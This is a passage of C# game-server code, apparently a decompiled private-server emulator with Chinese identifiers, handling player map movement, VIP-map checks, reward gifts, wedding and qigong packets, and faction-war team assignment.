					else if (Buffer.ToInt32(装备栏包裹[j].物品ID, 0) == 1000000199)
					{
						减去物品(j, 1);
					}
				}
				int num6 = 得到包裹空位(this);
				if (num6 != -1)
				{
					增加物品2(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(1000000365), num6, Buffer.GetBytes(1), new byte[56]);
				}
			}
			else
			{
				系统提示("五种灵玉都凑齐才可以兑换附混石。");
			}
		}

		public bool 移动地图VIP查询(int mapid)
		{
			if (base.FLD_VIP == 0)
			{
				string vIP地图 = World.VIP地图;
				char[] separator = new char[1]
				{
					';'
				};
				string[] array = vIP地图.Split(separator);
				foreach (string b in array)
				{
					if (坐标Class.getmapname(mapid) == b)
					{
						系统提示("本地图名是会员地图，非会员不可以进入。");
						return false;
					}
				}
			}
			return true;
		}

		public void 移动切换画面()
		{
			byte[] array = Converter.hexStringToByte("AA551E001C019100180011000000110000007D00000000000000020000006500000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 天魔移动(float x, float y, float z, int map)
		{
			int num = 0;
			try
			{
				if (map != 801 || (World.势力战进程 < 3 && World.势力战进程 != 0))
				{
					bool flag = false;
					if (map != base.人物坐标_地图)
					{
						移动切换画面();
					}
					if (base.人物坐标_地图 == map || 移动地图VIP查询(map))
					{
						if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
						{
							flag = true;
						}
						num = 1;
						if (base.人物坐标_地图 == 801)
						{
							发送势力战关闭消息();
						}
						移动离开当前地图(map);
						num = 2;
						byte[] array = Converter.hexStringToByte("AA5522005C0079001C000000000000000000000070410000C64465000000000000000000000055AA");
						base.人物坐标_X = x;
						base.人物坐标_Y = y;
						base.人物坐标_Z = z;
						base.人物坐标_地图 = map;
						移动时间 = DateTime.Now;
						num = 3;
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						num = 4;
						获取复查范围玩家();
						num = 5;
						获取复查范围Npc();
						num = 6;
						获取复查范围地面物品();
						num = 7;
						服务器时间();
						打开仓库中 = false;
						if (map != 42101 && World.申请攻城人物列表.Contains(this))
						{
							World.申请攻城人物列表.Remove(this);
						}
						上次坐标X = x;
						上次坐标Y = y;
						num = 8;
						if (map != 9001 && map != 9101 && map != 9201)
						{
							switch (行走状态id)
							{
							case 2:
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
									追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
									行走状态id = 2;
									状态效果(BitConverter.GetBytes(601101), 1, 300000);
									行走状态(BitConverter.GetBytes(601101), 2);
									num = 9;
									更新移动速度();
								}
								break;
							case 3:
								if (GetAddState(601102))
								{
									追加状态列表[601102].时间结束事件();
									追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
									行走状态id = 3;
									状态效果(BitConverter.GetBytes(601102), 1, 300000);
									行走状态(BitConverter.GetBytes(601102), 3);
									num = 10;
									更新移动速度();
								}
								break;
							case 5:
								if (GetAddState(601103))
								{
									追加状态列表[601103].时间结束事件();
									追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
									行走状态id = 5;
									状态效果(BitConverter.GetBytes(601103), 1, 300000);
									行走状态(BitConverter.GetBytes(601103), 5);
									num = 11;
									更新移动速度();
								}
								break;
							case 6:
								if (GetAddState(1001101))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001101].时间结束事件();
									追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
									行走状态id = 6;
									状态效果(BitConverter.GetBytes(1001101), 1, 300000);
									行走状态(BitConverter.GetBytes(1001101), 6);
									更新移动速度();
								}
								break;
							case 7:
								if (GetAddState(1001102))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001102].时间结束事件();
									追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
									行走状态id = 7;
									状态效果(BitConverter.GetBytes(1001102), 1, 300000);
									行走状态(BitConverter.GetBytes(1001102), 7);
									更新移动速度();
								}
								break;
							case 8:
								if (GetAddState(1001201))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001201].时间结束事件();
									追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
									行走状态id = 8;
									状态效果(BitConverter.GetBytes(1001201), 1, 300000);
									行走状态(BitConverter.GetBytes(1001201), 8);
									更新移动速度();
								}
								break;
							case 9:
								if (GetAddState(1001202))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001202].时间结束事件();
									追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
									行走状态id = 9;
									状态效果(BitConverter.GetBytes(1001202), 1, 300000);
									行走状态(BitConverter.GetBytes(1001202), 9);
									更新移动速度();
								}
								break;
							}
						}
						else
						{
							if (GetAddState(601101))
							{
								追加状态列表[601101].时间结束事件();
							}
							if (GetAddState(601102))
							{
								追加状态列表[601102].时间结束事件();
							}
							if (GetAddState(601103))
							{
								追加状态列表[601103].时间结束事件();
							}
							if (GetAddState(1001101))
							{
								追加状态列表[1001101].时间结束事件();
							}
							if (GetAddState(1001102))
							{
								追加状态列表[1001102].时间结束事件();
							}
							if (GetAddState(1001201))
							{
								追加状态列表[1001201].时间结束事件();
							}
							if (GetAddState(1001202))
							{
								追加状态列表[1001202].时间结束事件();
							}
							更新人物数据(this);
							更新装备效果to(this, this);
						}
						if (map == 801 && World.势力战进程 == 3)
						{
							发送势力战消息2();
							发送势力战消息();
							if (!flag)
							{
								if (移动地图计时器 != null)
								{
									移动地图计时器.Enabled = false;
									移动地图计时器.Close();
									移动地图计时器.Dispose();
									移动地图计时器 = null;
								}
								触发地图移动事件 = true;
								移动地图计时器 = new System.Timers.Timer(90000.0);
								移动地图计时器.Elapsed += 移动结束事件;
								移动地图计时器.Enabled = true;
								移动地图计时器.AutoReset = false;
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public void 死亡移动(float x, float y, float z, int map)
		{
			int num = 0;
			try
			{
				bool flag = false;
				if (base.人物坐标_地图 == map || 移动地图VIP查询(map))
				{
					if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
					{
						flag = true;
					}
					num = 1;
					if (base.人物坐标_地图 == 801)
					{
						发送势力战关闭消息();
					}
					移动离开当前地图(map);
					num = 2;
					byte[] array = Converter.hexStringToByte("AA5522005C0079001C000000000000000000000070410000C64465000000000000000000000055AA");
					base.人物坐标_X = x;
					base.人物坐标_Y = y;
					base.人物坐标_Z = z;
					base.人物坐标_地图 = map;
					移动时间 = DateTime.Now;
					num = 3;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(1), 0, array, 34, 2);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					num = 4;
					获取复查范围玩家();
					num = 5;
					获取复查范围Npc();
					num = 6;
					获取复查范围地面物品();
					num = 7;
					服务器时间();
					打开仓库中 = false;
					if (map != 42101 && World.申请攻城人物列表.Contains(this))
					{
						World.申请攻城人物列表.Remove(this);
					}
					if (map == 801)
					{
						if (map == 801 && World.势力战进程 == 3)
						{
							发送势力战消息2();
							发送势力战消息();
						}
						if (map == 801 && World.势力战进程 == 1)
						{
							更新人物数据(this);
							更新装备效果();
						}
					}
					上次坐标X = x;
					上次坐标Y = y;
					num = 8;
					if (map != 9001 && map != 9101 && map != 9201)
					{
						switch (行走状态id)
						{
						case 2:
							if (GetAddState(601101))
							{
								追加状态列表[601101].时间结束事件();
								追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
								行走状态id = 2;
								状态效果(BitConverter.GetBytes(601101), 1, 300000);
								行走状态(BitConverter.GetBytes(601101), 2);
								num = 9;
								更新移动速度();
							}
							break;
						case 3:
							if (GetAddState(601102))
							{
								追加状态列表[601102].时间结束事件();
								追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
								行走状态id = 3;
								状态效果(BitConverter.GetBytes(601102), 1, 300000);
								行走状态(BitConverter.GetBytes(601102), 3);
								num = 10;
								更新移动速度();
							}
							break;
						case 5:
							if (GetAddState(601103))
							{
								追加状态列表[601103].时间结束事件();
								追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
								行走状态id = 5;
								状态效果(BitConverter.GetBytes(601103), 1, 300000);
								行走状态(BitConverter.GetBytes(601103), 5);
								num = 11;
								更新移动速度();
							}
							break;
						case 6:
							if (GetAddState(1001101))
							{
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								追加状态列表[1001101].时间结束事件();
								追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
								行走状态id = 6;
								状态效果(BitConverter.GetBytes(1001101), 1, 300000);
								行走状态(BitConverter.GetBytes(1001101), 6);
								更新移动速度();
							}
							break;
						case 7:
							if (GetAddState(1001102))
							{
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								追加状态列表[1001102].时间结束事件();
								追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
								行走状态id = 7;
								状态效果(BitConverter.GetBytes(1001102), 1, 300000);
								行走状态(BitConverter.GetBytes(1001102), 7);
								更新移动速度();
							}
							break;
						case 8:
							if (GetAddState(1001201))
							{
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								追加状态列表[1001201].时间结束事件();
								追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
								行走状态id = 8;
								状态效果(BitConverter.GetBytes(1001201), 1, 300000);
								行走状态(BitConverter.GetBytes(1001201), 8);
								更新移动速度();
							}
							break;
						case 9:
							if (GetAddState(1001202))
							{
								if (潜行模式 == 1)
								{
									潜行状态(0);
								}
								追加状态列表[1001202].时间结束事件();
								追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
								行走状态id = 9;
								状态效果(BitConverter.GetBytes(1001202), 1, 300000);
								行走状态(BitConverter.GetBytes(1001202), 9);
								更新移动速度();
							}
							break;
						}
					}
					else
					{
						if (GetAddState(601101))
						{
							追加状态列表[601101].时间结束事件();
						}
						if (GetAddState(601102))
						{
							追加状态列表[601102].时间结束事件();
						}
						if (GetAddState(601103))
						{
							追加状态列表[601103].时间结束事件();
						}
						if (GetAddState(1001101))
						{
							追加状态列表[1001101].时间结束事件();
						}
						if (GetAddState(1001102))
						{
							追加状态列表[1001102].时间结束事件();
						}
						if (GetAddState(1001201))
						{
							追加状态列表[1001201].时间结束事件();
						}
						if (GetAddState(1001202))
						{
							追加状态列表[1001202].时间结束事件();
						}
						更新人物数据(this);
						更新装备效果to(this, this);
					}
					if (!flag)
					{
						if (移动地图计时器 != null)
						{
							移动地图计时器.Enabled = false;
							移动地图计时器.Close();
							移动地图计时器.Dispose();
							移动地图计时器 = null;
						}
						触发地图移动事件 = true;
						移动地图计时器 = new System.Timers.Timer(90000.0);
						移动地图计时器.Elapsed += 移动结束事件;
						移动地图计时器.Enabled = true;
						移动地图计时器.AutoReset = false;
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public void 移动(float x, float y, float z, int map)
		{
			int num = 0;
			try
			{
				if (map != 801 || (World.势力战进程 < 3 && World.势力战进程 != 0))
				{
					bool flag = false;
					if (base.人物坐标_地图 == map || 移动地图VIP查询(map))
					{
						if (base.人物坐标_地图 == map && (double)base.人物坐标_X == (double)x && (double)base.人物坐标_Y == (double)y)
						{
							flag = true;
						}
						num = 1;
						if (base.人物坐标_地图 == 801)
						{
							发送势力战关闭消息();
						}
						移动离开当前地图(map);
						num = 2;
						byte[] array = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
						base.人物坐标_X = x;
						base.人物坐标_Y = y;
						base.人物坐标_Z = z;
						base.人物坐标_地图 = map;
						移动时间 = DateTime.Now;
						num = 3;
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
						System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array, array.Length);
						}
						num = 4;
						获取复查范围玩家();
						num = 5;
						获取复查范围Npc();
						num = 6;
						获取复查范围地面物品();
						num = 7;
						服务器时间();
						打开仓库中 = false;
						if (map != 42101 && World.申请攻城人物列表.Contains(this))
						{
							World.申请攻城人物列表.Remove(this);
						}
						if (map == 801)
						{
							if (map == 801 && World.势力战进程 == 3)
							{
								发送势力战消息2();
								发送势力战消息();
							}
							if (map == 801 && World.势力战进程 == 1)
							{
								更新人物数据(this);
								更新装备效果();
							}
						}
						上次坐标X = x;
						上次坐标Y = y;
						num = 8;
						if (map != 9001 && map != 9101 && map != 9201)
						{
							switch (行走状态id)
							{
							case 2:
								if (GetAddState(601101))
								{
									追加状态列表[601101].时间结束事件();
									追加状态列表.Add(601101, new 追加状态类(this, 300000, 601101, 0));
									行走状态id = 2;
									状态效果(BitConverter.GetBytes(601101), 1, 300000);
									行走状态(BitConverter.GetBytes(601101), 2);
									num = 9;
									更新移动速度();
								}
								break;
							case 3:
								if (GetAddState(601102))
								{
									追加状态列表[601102].时间结束事件();
									追加状态列表.Add(601102, new 追加状态类(this, 300000, 601102, 0));
									行走状态id = 3;
									状态效果(BitConverter.GetBytes(601102), 1, 300000);
									行走状态(BitConverter.GetBytes(601102), 3);
									num = 10;
									更新移动速度();
								}
								break;
							case 5:
								if (GetAddState(601103))
								{
									追加状态列表[601103].时间结束事件();
									追加状态列表.Add(601103, new 追加状态类(this, 300000, 601103, 0));
									行走状态id = 5;
									状态效果(BitConverter.GetBytes(601103), 1, 300000);
									行走状态(BitConverter.GetBytes(601103), 5);
									num = 11;
									更新移动速度();
								}
								break;
							case 6:
								if (GetAddState(1001101))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001101].时间结束事件();
									追加状态列表.Add(1001101, new 追加状态类(this, 300000, 1001101, 0));
									行走状态id = 6;
									状态效果(BitConverter.GetBytes(1001101), 1, 300000);
									行走状态(BitConverter.GetBytes(1001101), 6);
									更新移动速度();
								}
								break;
							case 7:
								if (GetAddState(1001102))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001102].时间结束事件();
									追加状态列表.Add(1001102, new 追加状态类(this, 300000, 1001102, 0));
									行走状态id = 7;
									状态效果(BitConverter.GetBytes(1001102), 1, 300000);
									行走状态(BitConverter.GetBytes(1001102), 7);
									更新移动速度();
								}
								break;
							case 8:
								if (GetAddState(1001201))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001201].时间结束事件();
									追加状态列表.Add(1001201, new 追加状态类(this, 300000, 1001201, 0));
									行走状态id = 8;
									状态效果(BitConverter.GetBytes(1001201), 1, 300000);
									行走状态(BitConverter.GetBytes(1001201), 8);
									更新移动速度();
								}
								break;
							case 9:
								if (GetAddState(1001202))
								{
									if (潜行模式 == 1)
									{
										潜行状态(0);
									}
									追加状态列表[1001202].时间结束事件();
									追加状态列表.Add(1001202, new 追加状态类(this, 300000, 1001202, 0));
									行走状态id = 9;
									状态效果(BitConverter.GetBytes(1001202), 1, 300000);
									行走状态(BitConverter.GetBytes(1001202), 9);
									更新移动速度();
								}
								break;
							}
						}
						else
						{
							if (GetAddState(601101))
							{
								追加状态列表[601101].时间结束事件();
							}
							if (GetAddState(601102))
							{
								追加状态列表[601102].时间结束事件();
							}
							if (GetAddState(601103))
							{
								追加状态列表[601103].时间结束事件();
							}
							if (GetAddState(1001101))
							{
								追加状态列表[1001101].时间结束事件();
							}
							if (GetAddState(1001102))
							{
								追加状态列表[1001102].时间结束事件();
							}
							if (GetAddState(1001201))
							{
								追加状态列表[1001201].时间结束事件();
							}
							if (GetAddState(1001202))
							{
								追加状态列表[1001202].时间结束事件();
							}
							更新人物数据(this);
							更新装备效果to(this, this);
						}
						if (!flag)
						{
							if (移动地图计时器 != null)
							{
								移动地图计时器.Enabled = false;
								移动地图计时器.Close();
								移动地图计时器.Dispose();
								移动地图计时器 = null;
							}
							触发地图移动事件 = true;
							移动地图计时器 = new System.Timers.Timer(90000.0);
							移动地图计时器.Elapsed += 移动结束事件;
							移动地图计时器.Enabled = true;
							移动地图计时器.AutoReset = false;
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "移动 出错 [" + base.Userid + "][" + base.UserName + "][" + num + "][" + x + "][" + y + "][" + z + "][" + map + "]" + ex.Message);
			}
		}

		public void 移动结束事件(object sender, ElapsedEventArgs e)
		{
			try
			{
				触发地图移动事件 = false;
				if (移动地图计时器 != null)
				{
					移动地图计时器.Enabled = false;
					移动地图计时器.Close();
					移动地图计时器.Dispose();
					移动地图计时器 = null;
				}
			}
			catch
			{
			}
		}

		public void Npc传送(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			System.Buffer.BlockCopy(Buffer.GetBytes(0), 0, 封包数据, 3, 1);
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(封包数据, 封包数据.Length);
			}
			byte[] array = new byte[2];
			System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			if (Buffer.ToInt16(array, 0) != 3)
			{
				return;
			}
			if (World.势力战进程 < 4 && World.势力战进程 > 0)
			{
				if (Buffer.IsEquals(base.势力战派别, "仙族"))
				{
					移动(520f, 0f, 15f, 801);
				}
				else
				{
					移动(-520f, 0f, 15f, 801);
				}
			}
			byte[] array2 = Converter.hexStringToByte("AA551E0071009100100002000000020000000900000000000000000000000000569A55AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 赠送系统(int 赠送大类)
		{
			try
			{
				int num = 0;
				int num2 = 0;
				int int_ = 0;
				string text = string.Empty;
				string text2 = string.Empty;
				switch (赠送大类)
				{
				case 1:
					num = 4;
					int_ = World.上线送礼包套装;
					break;
				case 3:
					try
					{
						foreach (等级奖励类 value in World.等级奖励.Values)
						{
							if (base.Player_Level == value.等级)
							{
								if (value.武勋 != 0)
								{
									base.Player_WuXun += value.武勋;
									系统提示("得到武勋" + value.武勋 + "点。");
									更新武功和状态();
								}
								if (value.套装 != 0)
								{
									int num5 = 得到包裹空位位置();
									if (num5 == -1)
									{
										系统提示("背包没有空位了。");
										break;
									}
									增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(value.套装), num5, Buffer.GetBytes(1), new byte[56], true);
									系统提示("恭喜你获得一套装备,快快打开看吧。");
								}
								if (value.元宝 != 0)
								{
									查百宝阁元宝数();
									检察元宝数据(value.元宝, 1);
									RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "等级奖励", 1, value.元宝);
									保存元宝数据();
								}
								if (value.金钱.Length != 0)
								{
									base.Player_Money += long.Parse(value.金钱);
									系统提示("得到游戏币" + value.金钱 + "两。");
									得到钱的提示(uint.Parse(value.金钱));
									更新金钱和负重();
								}
								if (value.单件物品.Length != 0)
								{
									string[] array3 = value.单件物品.Split(';');
									for (int i = 0; i < Convert.ToInt32(array3[1]); i++)
									{
										int num6 = 得到包裹空位位置();
										if (num6 == -1)
										{
											系统提示("背包没有空位了。");
											return;
										}
										增加物品带属性(Convert.ToInt32(array3[0]), num6, 1, Convert.ToInt32(array3[2]), Convert.ToInt32(array3[3]), Convert.ToInt32(array3[4]), Convert.ToInt32(array3[5]), Convert.ToInt32(array3[6]), Convert.ToInt32(array3[7]), Convert.ToInt32(array3[8]), Convert.ToInt32(array3[9]), Convert.ToInt32(array3[10]), 0);
									}
								}
							}
						}
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "等级奖励系统出错!      [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
					}
					return;
				case 4:
					num = World.势力战奖励类型;
					num2 = World.势力战奖励数量;
					text = World.势力战奖励属性;
					int_ = World.势力战奖励套装;
					text2 = World.势力战奖励物品;
					goto default;
				default:
					switch (num)
					{
					default:
						系统提示("未开放的功能。");
						return;
					case 0:
						base.Player_WuXun += num2;
						系统提示("得到武勋" + num2 + "点。");
						更新武功和状态();
						return;
					case 1:
						查百宝阁元宝数();
						检察元宝积分数据(num2, 1);
						保存元宝数据();
						return;
					case 2:
						base.Player_Money += num2;
						系统提示("得到游戏币" + num2 + "两。");
						得到钱的提示((uint)num2);
						更新金钱和负重();
						return;
					case 3:
					{
						string[] array = text.Split(';');
						更新HP_MP_SP();
						更新武功和状态();
						更新人物数据(this);
						系统提示("获得      生命" + Convert.ToInt32(array[0]) + "      攻击" + Convert.ToInt32(array[1]) + "      防御" + Convert.ToInt32(array[2]) + "      回避" + Convert.ToInt32(array[3]) + "      内功" + Convert.ToInt32(array[4]) + "      命中" + Convert.ToInt32(array[5]) + "。");
						return;
					}
					case 4:
						break;
					case 5:
					{
						string[] array2 = text2.Split(';');
						int num3 = 0;
						while (true)
						{
							if (num3 >= Convert.ToInt32(array2[1]))
							{
								return;
							}
							int num4 = 得到包裹空位位置();
							if (num4 == -1)
							{
								break;
							}
							增加物品带属性(Convert.ToInt32(array2[0]), num4, 1, Convert.ToInt32(array2[2]), Convert.ToInt32(array2[3]), Convert.ToInt32(array2[4]), Convert.ToInt32(array2[5]), Convert.ToInt32(array2[6]), Convert.ToInt32(array2[7]), Convert.ToInt32(array2[8]), Convert.ToInt32(array2[9]), Convert.ToInt32(array2[10]), 0);
							num3++;
						}
						系统提示("背包没有空位了。");
						return;
					}
					case 6:
						if (base.FLD_VIP == 1)
						{
							base.FLD_VIPTIM.AddDays(num2);
						}
						else
						{
							base.FLD_VIP = 1;
							base.FLD_VIPTIM = DateTime.Now.AddDays(num2);
						}
						保存会员数据();
						系统提示("恭喜你,得到" + num2 + "天会员！");
						系统提示("你的VIP到期时间是:" + base.FLD_VIPTIM.ToString("yyyy年MM月dd日      hh时mm分"));
						return;
					}
					break;
				}
				int num7 = 得到包裹空位位置();
				if (num7 == -1)
				{
					系统提示("背包没有空位了。");
				}
				else
				{
					增加物品(Buffer.GetBytes(RxjhClass.GetDBItmeId()), Buffer.GetBytes(int_), num7, Buffer.GetBytes(1), new byte[56], true);
				}
			}
			catch (Exception ex2)
			{
				string text3 = string.Empty;
				switch (赠送大类)
				{
				case 1:
					text3 = "新手上线赠送";
					break;
				case 2:
					text3 = "转生赠送";
					break;
				case 3:
					text3 = "等级奖励";
					break;
				case 4:
					text3 = "势力战奖励";
					break;
				}
				Form1.WriteLine(1, "赠送系统出错!      " + text3 + "[" + base.Userid + "]-[" + base.UserName + "]" + ex2.Message);
			}
		}

		public void 结婚功能包(int 阶段, string 新郎名字, string 新娘名字, int 标识)
		{
			byte[] array = Converter.hexStringToByte("AA55460043057A17380026000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003B0955AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(阶段), 0, array, 10, 4);
			System.Buffer.BlockCopy(Encoding.Default.GetBytes(新郎名字), 0, array, 18, Encoding.Default.GetBytes(新郎名字).Length);
			System.Buffer.BlockCopy(Encoding.Default.GetBytes(新娘名字), 0, array, 33, Encoding.Default.GetBytes(新娘名字).Length);
			System.Buffer.BlockCopy(BitConverter.GetBytes(标识), 0, array, 50, 4);
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void PVP黄龙对战(int a, int b, int c)
		{
			发包类 发包类 = new 发包类();
			发包类.Write4(a);
			发包类.Write4(b);
			发包类.Write4(c);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 8705, base.人物全服ID);
			}
		}

		public void 查看气功(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			Players players = 得到人物数据(num);
			if (players == null)
			{
				return;
			}
			发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write2(num);
			发包类.Write2(0);
			发包类.Write2(players.Player_Qigong_point);
			for (int i = 0; i < 15; i++)
			{
				if (i < 12)
				{
					发包类.Write2(players.气功[i].气功ID);
					if (players.气功[i].气功ID != 0)
					{
						if (players.气功[i].气功量 != 0)
						{
							发包类.Write2(players.气功[i].气功量 + players.FLD_装备_追加_气功 + players.FLD_人物_追加_气功 + players.人物_WX_BUFF_气功 + (int)players.得到单项气功增加值(i) + players.FLD_药品_追加_气功);
						}
						else
						{
							发包类.Write2(0);
						}
					}
					else
					{
						发包类.Write2(0);
					}
				}
				else
				{
					发包类.Write4(0);
				}
			}
			if (players.Player_Job_leve >= 6)
			{
				foreach (升天气功类 value in players.升天气功.Values)
				{
					发包类.Write2(value.气功ID);
					if (value.气功量 != 0)
					{
						发包类.Write2(value.气功量 + players.FLD_装备_追加_气功 + players.FLD_人物_追加_气功 + players.人物_WX_BUFF_气功 + (int)players.得到单项气功增加值(value.气功ID) + players.FLD_药品_追加_气功);
					}
					else
					{
						发包类.Write2(0);
					}
				}
				for (int j = 0; j < 15 - players.升天气功.Count; j++)
				{
					发包类.Write2(0);
					发包类.Write2(0);
				}
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 9241, base.人物全服ID);
			}
		}

		public void 势力战系统(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			if (base.人物坐标_地图 == 9001 || base.人物坐标_地图 == 9101 || base.人物坐标_地图 == 9201 || (base.Player死亡 && base.人物坐标_地图 != 801) || 交易.交易中 || 退出中 || 打开仓库中)
			{
				return;
			}
			System.Buffer.BlockCopy(Buffer.GetBytes(0), 0, 封包数据, 3, 1);
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			byte[] array = new byte[2];
			byte[] array2 = new byte[2];
			System.Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			System.Buffer.BlockCopy(封包数据, 18, array2, 0, 2);
			switch (Buffer.ToInt16(array, 0))
			{
			default:
				System.Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
				System.Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
				break;
			case 11:
				移动(499f, 2215f, 15f, 101);
				获取复查范围玩家();
				获取复查范围Npc();
				获取复查范围地面物品();
				break;
			case 2:
				if (Buffer.ToInt16(array2, 0) != 1)
				{
					break;
				}
				if (base.人物坐标_地图 == 801)
				{
					return;
				}
				if (base.Player_Job_leve >= 2 && base.人物坐标_地图 != 801)
				{
					System.Buffer.BlockCopy(Buffer.GetBytes(2), 0, 封包数据, 10, 2);
					System.Buffer.BlockCopy(Buffer.GetBytes(2), 0, 封包数据, 14, 2);
					if (World.势力战正人数 == World.势力战邪人数)
					{
						World.势力战正人数++;
						base.势力战派别 = "仙族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(520f, 0f, 15f, 801);
						}
						else
						{
							移动(520f, 0f, 15f, 801);
						}
						系统提示("您属于【仙族】,敌对势力为【黑披风烟雾效果】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
					else if (World.势力战正人数 > World.势力战邪人数)
					{
						World.势力战邪人数++;
						base.势力战派别 = "魔族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(-520f, 0f, 15f, 801);
						}
						else
						{
							移动(-520f, 0f, 15f, 801);
						}
						系统提示("您属于【魔族】,敌对势力为【白披风】,如自身披风外观异常,请打开披风效果。", 7, "系统提示");
					}
					else if (World.势力战正人数 < World.势力战邪人数)
					{
						World.势力战正人数++;
						base.势力战派别 = "仙族";
						if (World.是否开启共用银币市场 == 1)
						{
							World.conn.发送("势力战人数|" + World.势力战正人数 + "|" + World.势力战邪人数);
							换线移动(520f, 0f, 15f, 801);
						}
						else
						{
							移动(520f, 0f, 15f, 801);
						}
